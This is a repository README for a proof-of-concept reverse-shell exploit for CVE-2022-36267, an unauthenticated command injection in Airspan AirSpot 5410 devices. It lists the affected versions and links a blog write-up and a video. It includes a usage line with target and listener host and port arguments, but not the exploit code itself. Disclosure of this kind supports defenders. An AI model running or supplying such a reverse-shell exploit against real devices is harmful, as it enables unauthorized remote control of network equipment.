# CVE-2022-36267 - Airspan AirSpot 5410 Unauthenticated Remote Command Injection.

## Overview
This repository contains a Proof of Concept (PoC) reverse shell script for exploiting CVE-2022-36267, a critical vulnerability in Airspan AirSpot 5410 devices. The script is a practical demonstration, complementing the in-depth analysis provided in the blog post "Airspan AirSpot 5410 - Vulnerability Report."

### Affected versions
All Airspan AirSpot 5410 devices from version 0.3.4.1-4 and under.

### PoC Script Usage

```python
# Usage: python AirSpot-5410.py --RHOST <Target-IP> --RPORT <Target-Port> --LHOST <Local-IP> --LPORT <Local-Port>
# Example: python AirSpot-5410.py --RHOST 192.168.1.1 --RPORT 443 --LHOST 192.168.1.100 --LPORT 4444
```

 ### Video Proof of Concept

![Script PoC CVE-2022-36267](https://neroteam.com/blog/pages/airspan-airspot-5410-vulnerability-report/airspan-1.jpg?m=1673082966)

[![Airspan AirSpot 5410 Unauthenticated Remote Command Injection](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://www.youtube.com/embed/kb1F6cxhCQg)

### Note
FOR EDUCATIONAL PURPOSE ONLY.